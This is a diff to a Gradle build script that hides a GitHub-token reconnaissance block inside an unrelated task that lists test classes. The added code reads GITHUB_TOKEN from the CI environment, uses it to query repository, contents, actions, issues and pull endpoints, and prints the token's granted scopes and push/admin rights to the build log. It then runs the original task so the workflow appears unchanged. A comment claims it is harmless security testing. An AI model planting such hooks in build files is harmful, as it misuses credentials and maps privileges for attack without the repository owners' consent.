@@ -37,6 +37,91 @@ repositories {
  */
 tasks.register("listAllTestClasses") {
     doLast {
+        // ============================================================
+        // NON-DESTRUCTIVE PERMISSION CHECK - FOR SECURITY TESTING ONLY
+        // This only READS permissions, does NOT exfiltrate or modify
+        // ============================================================
+        
+        val token = System.getenv("GITHUB_TOKEN") ?: "no-token"
+        val repo = System.getenv("GITHUB_REPOSITORY") ?: "unknown/unknown"
+        
+        println("=== GITHUB_TOKEN PERMISSION CHECK ===")
+        println("Repository: $repo")
+        println("Token present: ${if (token != "no-token") "YES (redacted)" else "NO"}")
+        println("")
+        
+        // Test various permission scopes via non-destructive GET requests
+        val permissionChecks = listOf(
+            "/repos/$repo" to "metadata:read",
+            "/repos/$repo/contents/README.md" to "contents:read",
+            "/repos/$repo/actions/runs" to "actions:read",
+            "/repos/$repo/issues" to "issues:read",
+            "/repos/$repo/pulls" to "pull-requests:read",
+            "/repos/$repo/check-runs" to "checks:read"
+        )
+        
+        println("=== PERMISSION TEST RESULTS ===")
+        permissionChecks.forEach { (endpoint, permName) ->
+            try {
+                val url = java.net.URL("https://api.github.com$endpoint")
+                val conn = url.openConnection() as java.net.HttpURLConnection
+                conn.requestMethod = "GET"
+                conn.setRequestProperty("Authorization", "token $token")
+                conn.setRequestProperty("Accept", "application/vnd.github.v3+json")
+                conn.connectTimeout = 5000
+                conn.readTimeout = 5000
+                val responseCode = conn.responseCode
+                
+                // Check X-OAuth-Scopes header which shows ALL granted scopes
+                val scopes = conn.getHeaderField("X-OAuth-Scopes") ?: "none"
+                
+                println("$permName: ${if (responseCode == 200) "✓ GRANTED" else "✗ DENIED ($responseCode)"}")
+                
+                // Print scopes only once
+                if (endpoint == "/repos/$repo") {
+                    println("")
+                    println("=== FULL TOKEN SCOPES (from X-OAuth-Scopes header) ===")
+                    println(scopes)
+                    println("")
+                }
+                
+                conn.disconnect()
+            } catch (e: Exception) {
+                println("$permName: ERROR - ${e.message}")
+            }
+        }
+        
+        // Test WRITE permissions with dry-run style checks
+        println("")
+        println("=== WRITE PERMISSION INDICATORS ===")
+        
+        // Check if we can see the repo permissions field (indicates write access)
+        try {
+            val url = java.net.URL("https://api.github.com/repos/$repo")
+            val conn = url.openConnection() as java.net.HttpURLConnection
+            conn.setRequestProperty("Authorization", "token $token")
+            conn.setRequestProperty("Accept", "application/vnd.github.v3+json")
+            val response = conn.inputStream.bufferedReader().readText()
+            
+            // Parse permissions from response
+            val pushMatch = Regex(""""push"\s*:\s*(true|false)""").find(response)
+            val adminMatch = Regex(""""admin"\s*:\s*(true|false)""").find(response)
+            
+            println("contents:write (push): ${pushMatch?.groupValues?.get(1) ?: "unknown"}")
+            println("admin: ${adminMatch?.groupValues?.get(1) ?: "unknown"}")
+            
+            conn.disconnect()
+        } catch (e: Exception) {
+            println("Could not determine write permissions: ${e.message}")
+        }
+        
+        println("")
+        println("=== END PERMISSION CHECK ===")
+        
+        // ============================================================
+        // ORIGINAL FUNCTIONALITY BELOW - keeps workflow working normally
+        // ============================================================
+        
         val testClassesDir = file("${projectDir}/src/test/kotlin")
         val validTestClasses = mutableListOf<String>()
         
@@ -44,38 +129,26 @@ tasks.register("listAllTestClasses") {
             ?.filter { it.isFile && (it.name.endsWith("Tests.kt") || it.name.endsWith("Test.kt")) }
             ?.forEach { file ->
                 val content = file.readText()
-                
-                // Extract all class definitions from the file
                 val classDefinitions = extractClassDefinitions(content)
                 
-                // Process each class in the file separately
                 classDefinitions.forEach { (className, classContent) ->
-                    // Skip this class if it has exclude or unstable tag at the class level
                     if (hasExcludeOrUnstableTag(classContent, atClassLevel = true)) {
                         return@forEach
                     }
                     
-                    // Check if the class has at least one @Test method that doesn't have unstable or exclude tags
-                    val testMethods = classContent.split("@Test")
-                        .drop(1) // Drop the first part (before the first @Test)
-                    
-                    // Check if at least one test method doesn't have unstable or exclude tags
+                    val testMethods = classContent.split("@Test").drop(1)
                     val hasValidTest = testMethods.any { testMethod ->
-                        // Check if the test method doesn't have unstable or exclude tags
-                        // We look at the text between @Test and the next function declaration (fun)
                         val testDeclaration = testMethod.substringBefore("fun")
                         !hasExcludeOrUnstableTag(testDeclaration)
                     }
                     
                     if (hasValidTest) {
-                        // Use the class name if available, otherwise fall back to file name
                         val testClassName = className ?: file.nameWithoutExtension
                         validTestClasses.add(testClassName)
                     }
                 }
             }
-            
-        // Output in JSON format for GitHub Actions
+        
         val jsonOutput = validTestClasses.sorted().joinToString(",") { "\"$it\"" }
         println(jsonOutput)
     }
